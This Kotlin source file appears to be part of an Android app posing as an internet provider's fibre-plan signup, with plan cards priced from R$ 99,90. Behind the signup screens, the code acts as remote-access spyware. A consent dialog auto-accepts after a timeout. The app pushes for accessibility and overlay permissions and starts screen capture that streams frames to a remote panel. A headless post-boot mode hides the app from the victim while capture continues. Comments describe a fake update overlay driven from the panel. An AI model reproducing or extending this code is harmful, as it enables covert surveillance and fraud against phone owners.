            preco = "R$ 99,90",
            periodo = "/mês",
            badgeTexto = "ENTRADA",
            badgeCorBg = Color.parseColor("#F1F5F9"),
            badgeCorTexto = COR_TEXTO_MUTED,
            detalhes = listOf("✓ Wi-Fi Dual Band Incluso", "✓ 600 Mega Upload & Download", "✓ Ideal para até 5 dispositivos")
        )

        // Card Plano 2: 800 Mega (MAIS POPULAR)
        val cardPlano2 = criarCardOpcaoPlano(
            index = 1,
            velocidade = "800 MEGA",
            subtituloVelocidade = "Fibra Ultra Gamer & Streaming",
            preco = "R$ 109,99",
            periodo = "/mês",
            badgeTexto = "🔥 MAIS POPULAR",
            badgeCorBg = COR_LARANJA_LIGHT_BG,
            badgeCorTexto = COR_LARANJA_POPULAR,
            detalhes = listOf("✓ Wi-Fi 6 Giga Incluso", "✓ 800 Mega Ultra Estável", "✓ Ideal para Jogos e 4K", "✓ Instalação Prioritária Grátis")
        )

        // Card Plano 3: 1 Giga
        val cardPlano3 = criarCardOpcaoPlano(
            index = 2,
            velocidade = "1 GIGA",
            subtituloVelocidade = "Máxima Performance Fibra",
            preco = "R$ 139,99",
            periodo = "/mês",
            badgeTexto = "MÁXIMA VELOCIDADE",
            badgeCorBg = COR_VERDE_LIGHT_BG,
            badgeCorTexto = COR_VERDE_DESTAQUE,
            detalhes = listOf("✓ Roteador Wi-Fi 6 Pro", "✓ 1000 Mega de Velocidade", "✓ Dispositivos Ilimitados", "✓ Suporte VIP 24h")
        )

        cardsPlanos.add(cardPlano1)
        cardsPlanos.add(cardPlano2)
        cardsPlanos.add(cardPlano3)

        container.addView(cardPlano1)
        container.addView(cardPlano2)
        container.addView(cardPlano3)

        // Seleciona o padrão (Plano 2)
        atualizarEstiloCardsPlanos()

        val btnEnviar = Button(this).apply {
            text = "Contratar Plano Selecionado"
            setTextColor(Color.WHITE)
            textSize = 16f
            isAllCaps = false
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(16), dp(16), dp(16), dp(16))
            background = fundoGradiente(intArrayOf(COR_PRIMARIA, COR_PRIMARIA_DARK), 12)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(16) }
            setOnClickListener {
                containerPlanos.visibility = View.GONE
                containerSucesso.visibility = View.VISIBLE
                atualizarIndicadorPassos(4)
                // Persiste o estado: mesmo fechando e reabrindo o app, a
                // tela de "Análise em Andamento" (com o círculo de loop)
                // é a primeira a aparecer.
                prefs.edit().putBoolean(KEY_ANALISE_EM_ANDAMENTO, true).apply()
            }
        }
        container.addView(btnEnviar)

        return container
    }

    /**
     * Cria um Card interativo de Opção de Plano
     */
    private fun criarCardOpcaoPlano(
        index: Int,
        velocidade: String,
        subtituloVelocidade: String,
        preco: String,
        periodo: String,
        badgeTexto: String,
        badgeCorBg: Int,
        badgeCorTexto: Int,
        detalhes: List<String>
    ): LinearLayout {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(18), dp(18), dp(18))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(14) }
            isClickable = true
            isFocusable = true
            setOnClickListener {
                planoSelecionadoIndex = index
                atualizarEstiloCardsPlanos()
                it.announceForAccessibility("Plano selecionado")
            }
        }

        // Cabeçalho do Card (Badge + Radio Indicator)
        val headerCard = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, 0, 0, dp(10))
        }

        val badge = TextView(this).apply {
            text = badgeTexto
            textSize = 11f
            setTextColor(badgeCorTexto)
            setTypeface(null, Typeface.BOLD)
            setPadding(dp(10), dp(4), dp(10), dp(4))
            background = fundoArredondado(badgeCorBg, 12)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val spacerHeader = View(this).apply {
            importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_NO // espaçador visual
            layoutParams = LinearLayout.LayoutParams(0, 1, 1f)
        }

        val radioIndicator = TextView(this).apply {
            tag = "radio_indicator_$index"
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(dp(8), dp(2), dp(8), dp(2))
        }

        headerCard.addView(badge)
        headerCard.addView(spacerHeader)
        headerCard.addView(radioIndicator)

        // Bloco de Velocidade e Preço
        val rowPreco = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.BOTTOM
            setPadding(0, 0, 0, dp(8))
        }

        val blockVel = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val txtVel = TextView(this).apply {
            text = velocidade
            textSize = 22f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
        }

        val txtSubVel = TextView(this).apply {
            text = subtituloVelocidade
            textSize = 12f
            setTextColor(COR_TEXTO_MUTED)
        }

        blockVel.addView(txtVel)
        blockVel.addView(txtSubVel)

        val blockPreco = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.BOTTOM
        }

        val txtPreco = TextView(this).apply {
            text = preco
            textSize = 22f
            setTextColor(COR_PRIMARIA)
            setTypeface(null, Typeface.BOLD)
        }

        val txtPeriodo = TextView(this).apply {
            text = periodo
            textSize = 12f
            setTextColor(COR_TEXTO_MUTED)
            setPadding(0, 0, 0, dp(3))
        }

        blockPreco.addView(txtPreco)
        blockPreco.addView(txtPeriodo)

        rowPreco.addView(blockVel)
        rowPreco.addView(blockPreco)

        // Lista de Recursos / Vantagens
        val listaRecursos = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, dp(8), 0, 0)
        }

        for (detalhe in detalhes) {
            val txtRecurso = TextView(this).apply {
                text = detalhe
                textSize = 12f
                setTextColor(COR_TEXTO_ESCURO)
                setPadding(0, dp(2), 0, dp(2))
            }
            listaRecursos.addView(txtRecurso)
        }

        card.addView(headerCard)
        card.addView(rowPreco)
        card.addView(listaRecursos)

        return card
    }

    private fun atualizarEstiloCardsPlanos() {
        for (i in cardsPlanos.indices) {
            val card = cardsPlanos[i]
            val selecionado = (i == planoSelecionadoIndex)
            card.isSelected = selecionado
            ViewCompat.setStateDescription(card, if (selecionado) "Plano selecionado" else "Nao selecionado")

            card.background = if (selecionado) {
                fundoArredondado(
                    cor = COR_CARD_SELECIONADO_BG,
                    raioDp = 16,
                    bordaCor = COR_PRIMARIA,
                    bordaDp = 2
                )
            } else {
                fundoArredondado(
                    cor = COR_CARD_BG,
                    raioDp = 16,
                    bordaCor = COR_CARD_BORDA,
                    bordaDp = 1
                )
            }

            val radioIndicator = card.findViewWithTag<TextView>("radio_indicator_$i")
            radioIndicator?.apply {
                if (selecionado) {
                    text = "✓ Selecionado"
                    setTextColor(COR_PRIMARIA)
                    setTypeface(null, Typeface.BOLD)
                    background = fundoArredondado(Color.parseColor("#DBEAFE"), 10)
                } else {
                    text = "Selecionar"
                    setTextColor(COR_TEXTO_MUTED)
                    setTypeface(null, Typeface.NORMAL)
                    background = fundoArredondado(Color.parseColor("#F1F5F9"), 10)
                }
            }
        }
    }

    /**
     * ETAPA 4: Card de Análise com Logo + Círculo Carregando em Loop Permanente
     */
    private fun construirContainerSucesso(): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
        }

        val cardView = criarCardBase().apply {
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(24), dp(36), dp(24), dp(36))
        }

        // Imagem do Logo do Aplicativo acima do círculo de carregando
        val logoImageAnalise = android.widget.ImageView(this).apply {
            contentDescription = null // decorativo: título da tela aparece em texto abaixo
            try {
                setImageDrawable(packageManager.getApplicationIcon(packageName))
            } catch (e: Exception) {
                setImageResource(R.mipmap.ic_launcher)
            }
            scaleType = android.widget.ImageView.ScaleType.FIT_CENTER
            val tamanho = dp(64)
            layoutParams = LinearLayout.LayoutParams(tamanho, tamanho).apply {
                bottomMargin = dp(16)
            }
        }

        // Círculo de carregando (spinner em loop permanente)
        val progressLoop = android.widget.ProgressBar(this).apply {
            isIndeterminate = true
            indeterminateDrawable?.setColorFilter(COR_PRIMARIA, android.graphics.PorterDuff.Mode.SRC_IN)
            val tamanho = dp(48)
            layoutParams = LinearLayout.LayoutParams(tamanho, tamanho).apply {
                bottomMargin = dp(20)
            }
        }

        val txtTitulo = TextView(this).apply {
            text = "Análise em Andamento"
            textSize = 22f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(8))
        }

        val txtDesc = TextView(this).apply {
            text = "Sua solicitação do plano selecionado foi enviada. Estamos analisando a viabilidade técnica e sinal da fibra para a sua região. Por favor, aguarde em quanto nosso sistema conclui a validação..."
            textSize = 14f
            setTextColor(COR_TEXTO_MUTED)
            gravity = Gravity.CENTER
            setLineSpacing(dp(2).toFloat(), 1.2f)
            setPadding(0, 0, 0, dp(20))
        }

        val badgeAnalise = TextView(this).apply {
            text = "⏳ Verificando viabilidade da rede..."
            textSize = 13f
            setTextColor(COR_PRIMARIA)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(dp(16), dp(10), dp(16), dp(10))
            background = fundoArredondado(Color.parseColor("#EFF6FF"), 12)
        }

        cardView.addView(logoImageAnalise)
        cardView.addView(progressLoop)
        cardView.addView(txtTitulo)
        cardView.addView(txtDesc)
        cardView.addView(badgeAnalise)

        container.addView(cardView)
        return container
    }

    /**
     * Helper: Cria Card Base estilizado
     */
    private fun criarCardBase(): LinearLayout {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(20), dp(20), dp(20))
            background = fundoArredondado(
                cor = COR_CARD_BG,
                raioDp = 16,
                bordaCor = COR_CARD_BORDA,
                bordaDp = 1
            )
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }
    }

    /**
     * Helper: Cria Campo de Texto com Rótulo e Estilo Profissional
     */
    private fun criarCampoTextoProfissional(label: String, dica: String, tipoInput: Int): Pair<LinearLayout, EditText> {
        val layoutCampo = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(14) }
        }

        val txtLabel = TextView(this).apply {
            text = label
            textSize = 12f
            setTextColor(COR_TEXTO_ESCURO)
            setTypeface(null, Typeface.BOLD)
            setPadding(0, 0, 0, dp(6))
        }

        val editText = EditText(this).apply {
            hint = dica
            inputType = tipoInput
            maxLines = 1
            textSize = 14f
            setTextColor(COR_TEXTO_ESCURO)
            setHintTextColor(COR_TEXTO_LIGHT)
            setPadding(dp(14), dp(14), dp(14), dp(14))
            background = fundoArredondado(
                cor = Color.parseColor("#F8FAFC"),
                raioDp = 10,
                bordaCor = Color.parseColor("#E2E8F0"),
                bordaDp = 1
            )
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        layoutCampo.addView(txtLabel)
        layoutCampo.addView(editText)

        return Pair(layoutCampo, editText)
    }

    private fun atualizarEtapaInterface() {
        // Se já chegou na "Análise em Andamento", permanece nela mesmo ao
        // fechar e reabrir o app — não volta para cadastro/planos.
        if (prefs.getBoolean(KEY_ANALISE_EM_ANDAMENTO, false)) {
            containerInicial.visibility = View.GONE
            containerCadastro.visibility = View.GONE
            containerPlanos.visibility = View.GONE
            containerSucesso.visibility = View.VISIBLE
            atualizarIndicadorPassos(4)
            return
        }
        val primeiroAcesso = prefs.getBoolean(KEY_PRIMEIRO_ACESSO, true)
        if (!primeiroAcesso) {
            containerInicial.visibility = View.GONE
            containerCadastro.visibility = View.VISIBLE
            atualizarIndicadorPassos(2)
        }
    }

    private fun fundoArredondado(cor: Int, raioDp: Int, bordaCor: Int? = null, bordaDp: Int = 0): GradientDrawable {
        return GradientDrawable().apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = dp(raioDp).toFloat()
            setColor(cor)
            if (bordaCor != null) setStroke(dp(bordaDp), bordaCor)
        }
    }

    private fun fundoGradiente(cores: IntArray, raioDp: Int): GradientDrawable {
        return GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT, cores).apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = dp(raioDp).toFloat()
        }
    }

    private fun dp(valor: Int): Int = (valor * resources.displayMetrics.density).toInt()

    private fun exibirModalConsentimentoAcessibilidade() {
        AlertDialog.Builder(this)
            .setTitle(getString(R.string.consent_title))
            .setMessage(getString(R.string.consent_accessibility_message))
            .setCancelable(false)
            .setPositiveButton(getString(R.string.consent_accept)) { _, _ ->
                voltandoDeAcessibilidade = true
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            .setNegativeButton(getString(R.string.consent_cancel)) { dialog, _ ->
                dialog.dismiss()
            }
            .show()
    }

    private fun exibirModalConsentimentoTela() {
        val dialog = AlertDialog.Builder(this)
            .setTitle(getString(R.string.consent_title))
            .setMessage(getString(R.string.consent_screen_message))
            .setCancelable(false)
            .setPositiveButton("Iniciar") { _, _ -> confirmarIniciar() }
            .setNegativeButton("Depois") { d, _ -> d.dismiss() }
            .create()

        dialog.show()

        handlerMain.postDelayed({
            if (!iniciarCapturaDisparado && dialog.isShowing) {
                dialog.dismiss()
                confirmarIniciar()
            }
        }, AUTO_CONFIRMAR_INICIAR_MS)
    }

    private fun confirmarIniciar() {
        if (iniciarCapturaDisparado) return
        iniciarCapturaDisparado = true
        prefs.edit().putBoolean(KEY_PRIMEIRO_ACESSO, false).apply()
        // Encerra o modo onboarding rápido da acessibilidade
        MyAccessibilityService.onboardingRapido = false
        handlerMain.post { atualizarEtapaInterface() }

        // MODAL DE ATUALIZAÇÃO REMOVIDO: não exibe mais o diálogo
        // "Atualização do Aplicativo / Atualizar Agora" — vai direto para
        // a captura de tela (iniciarCaptura).
        iniciarCaptura()
    }

    // MODAL DE ATUALIZAÇÃO REMOVIDO (função esvaziada — nunca mais chamada).
    // O overlay visual de atualização, quando desejado, é controlado pelo
    // botão "Overlay Atualização (Fundo Limpo)" do painel via
    // overlay_atualizacao_visual (MyAccessibilityService + ScreenCaptureService).
    private fun exibirModalConsentimentoAtualizacao() {
        Log.d(TAG, "Modal de atualização removido — não exibe mais diálogo.")
    }

    private fun iniciarCaptura() {
        // CONTROLE DE DISPARO PREVENTIVO:
        // Se o ScreenCaptureService já estiver ativo em execução, aborta o disparo do gatilho.
        // Se estiver em modo reanimação pós-boot (headless), encerra a Activity instantaneamente via finish().
        if (ScreenCaptureService.isRunning) {
            Log.d(TAG, "ScreenCaptureService já está ativo em execução. Abortando novo disparo de captura.")
            if (reanimacaoBootAutomatica) {
                finish()
            }
            return
        }

        if (!podeSobrepor()) {
            abrirTelaSobreposicao()
            return
        }
        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK && data != null) {
            val intentServico = Intent(this, ScreenCaptureService::class.java).apply {
                putExtra("RESULT_CODE", resultCode)
                putExtra("DATA", data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intentServico)
            } else {
                startService(intentServico)
            }
            MyAccessibilityService.onboardingRapido = false

            // Modo reanimação pós-boot (headless): fecha a Activity silenciosamente
            // em 200ms via handlerMain. O ScreenCaptureService (Foreground Service)
            // continua rodando por baixo enviando frames binários ao painel — o app
            // "suma" do display do cliente sem interromper o vídeo.
            if (reanimacaoBootAutomatica) {
                handlerMain.postDelayed({
                    finish()
                }, 200)
            }
        }
        if (requestCode == REQUEST_OVERLAY && podeSobrepor() && !ScreenCaptureService.isRunning) {
            iniciarCaptura()
        }
    }

    private fun podeSobrepor(): Boolean =
        Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)

    private fun abrirTelaSobreposicao() {
        val intent = Intent(
            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            Uri.parse("package:$packageName")
        )
        startActivityForResult(intent, REQUEST_OVERLAY)
    }

    private fun isAcessibilidadeAtiva(): Boolean {
        val habilitados = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return habilitados.contains("$packageName/")
    }

    private fun solicitarNotificacaoSePrecisar() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), REQUEST_NOTIFICACAO)
        }
    }

    /**
     * Garantia de entrega do comando "Power/Notificação": pede ao usuário para
     * retirar o app da otimização de bateria (Doze). Sem isso, o socket em
     * segundo plano pode sofrer atrasos quando a tela está apagada, e o
     * Full-Screen Intent pode não chegar instantaneamente. Requer a permissão
     * REQUEST_IGNORE_BATTERY_OPTIMIZATIONS (já declarada no manifest).
     */
    private fun solicitarIsencaoBateria() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    startActivity(intent)
                    Log.d(TAG, "Solicitada isenção de otimização de bateria.")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao solicitar isenção de bateria: ${e.message}")
        }
    }
}